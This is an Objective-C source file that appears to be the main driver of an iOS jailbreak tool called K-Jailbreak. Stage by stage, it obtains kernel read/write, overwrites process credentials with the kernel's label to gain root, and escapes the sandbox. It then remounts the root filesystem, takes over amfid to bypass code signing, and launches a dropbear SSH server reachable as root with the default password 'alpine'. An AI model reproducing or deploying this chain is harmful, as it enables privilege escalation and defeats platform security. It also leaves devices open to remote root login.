//
//  jailbreak.m
//  K-Jailbreak
//
//  Created by xsf1re on 2021/04/16.
//

#import "jailbreak.h"
#include "exploit.h"
#include "krw.h"
#include "remount.h"
#include "amfi.h"
#include <sys/stat.h>
#include "bootstrap.h"
#include <spawn.h>
#include "jailbreak.h"
#include "ViewController.h"


@implementation jailbreak
+(void)jb {
    NSString *logText = nil;
    //  Stage 1 - Get kernel R/W privileges;
    mach_port_t tfp0 = getTFP0();
    if(tfp0 == MACH_PORT_NULL)
    {
        NSLog(@"Failed to get tfp0");
        return;
    }
    logText = [NSString stringWithFormat:@"tfp0: 0x%x\n", tfp0];
    [[ViewController sharedInstance].LogView insertText:logText];
    
    //  Stage 2 - Get kernel base and kernel slide;
    uint64_t kbase = getKBase();
    if(!kbase)
    {
        NSLog(@"Failed to get kbase\n");
        return;
    }
    uint64_t kslide = kbase - KERNEL_IMAGE_BASE;
    logText = [NSString stringWithFormat:@"kernel base: 0x%llx\n", kbase];
    [[ViewController sharedInstance].LogView insertText:logText];
    logText = [NSString stringWithFormat:@"kernel slide: 0x%llx\n", kslide];
    [[ViewController sharedInstance].LogView insertText:logText];
    
    //  Stage 3 - Get root and grab kernel credentials.
    uint64_t kernProc = getProc(0);
    uint64_t selfProc = getProc(getpid());
    
    uint64_t kernCreds = kread64(kernProc + PROC_P_PID_UCRED_OFF);
    uint64_t selfCreds = kread64(selfProc + PROC_P_PID_UCRED_OFF);
    
    uint64_t ourLabel = kread64(selfCreds + UCRED_CR_LABEL);
    kwrite64(selfCreds + UCRED_CR_LABEL, kread64(kernCreds + UCRED_CR_LABEL));
    kwrite32(selfCreds + UCRED_CR_SVUID, 0);
    
    setuid(0);
    setuid(0);
    kwrite64(selfCreds + UCRED_CR_LABEL, ourLabel);
    if(getuid() != 0)
    {
        NSLog(@"Failed to get root\n");
        return;
    }
    logText = [NSString stringWithFormat:@"Successfully got ROOT!\nuid: %d\n", getuid()];
    [[ViewController sharedInstance].LogView insertText:logText];
    
    //  Stage 4 - Escape Sandbox
    if(!escapeSandboxForProcess(getpid()))
    {
        NSLog(@"Failed to escape sandbox\n");
        return;
    }
    [[ViewController sharedInstance].LogView insertText:@"Successfully escape sandbox!\n"];
    
    //  Stage 5 - Set tfp0 to hsp4
    if(!SetHSP4(tfp0))
    {
        NSLog(@"Failed to set tfp0 to hsp4\n");
        return;
    }
    [[ViewController sharedInstance].LogView insertText:@"Successfully set tfp0 to hsp4!\n"];
    
    //  Stage 6.1 - Remount RootFS
    if(![remount remount:getProc(1)])
    {
        NSLog(@"Failed to remount rootfs!\n");
        return;
    }
    [[ViewController sharedInstance].LogView insertText:@"Successfully mounted RootFS!\n"];
    //  Stage 6.2 - Restore RootFS
//    if(![remount restore_rootfs])
//    {
//        NSLog(@"Failed to restore rootfs!\n");
//        return;
//    }
    
    //  Stage 7 - Make executable
    [amfi platformize:getpid()];
    [amfi grabEntitlements:getProc(getpid())];
    [amfi takeoverAmfid:getPidByName("amfid")];
    [[ViewController sharedInstance].LogView insertText:@"Successfully bypass AMFI!\n"];
    
    //  Stage 8 - Extract bootstraps
    [bootstrap bootstrapDevice];
    
    //  Stage 9 - run amfidebilitate
    
    
    //  Stage 10 - Configure dropbear and run SSH
    int rv;
    pid_t pd;
    
    [[NSFileManager defaultManager] removeItemAtPath:@"/bin/sh" error:nil];
    symlink("/shelly/bins/bash", "/bin/sh");
    
    mkdir("/etc/dropbear", 0755);
    mkdir("/var/log", 0755);
    fclose(fopen("/var/log/lastlog", "w+"));
    
    const char *args_dropbear[] = (const char *[]) {
            "dropbear",
            "-p",
            "22",
            "-p",
            "2222",
            "-R",
            "-E",
            "-m",
            "-S",
            "/",
            NULL
        };
    rv = posix_spawn(&pd, "/shelly/bins/dropbear", NULL, NULL, (char **)&args_dropbear, NULL);
    NSLog(@"posix ret: %d", rv);
    [amfi platformize:pd];

    [[ViewController sharedInstance].LogView insertText:@"Successfully run dropbear!\n"];
    [[ViewController sharedInstance].LogView insertText:@"SSH Port: 22, 2222\n"];
    [[ViewController sharedInstance].LogView insertText:@"root, mobile password: alpine\n"];
    [[ViewController sharedInstance].LogView insertText:@"Please export path before command!\n"];
    [[ViewController sharedInstance].LogView insertText:@"export PATH=\"/shelly/bins:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\n"];
    NSLog(@"K-Jailbreak End!");
}

@end
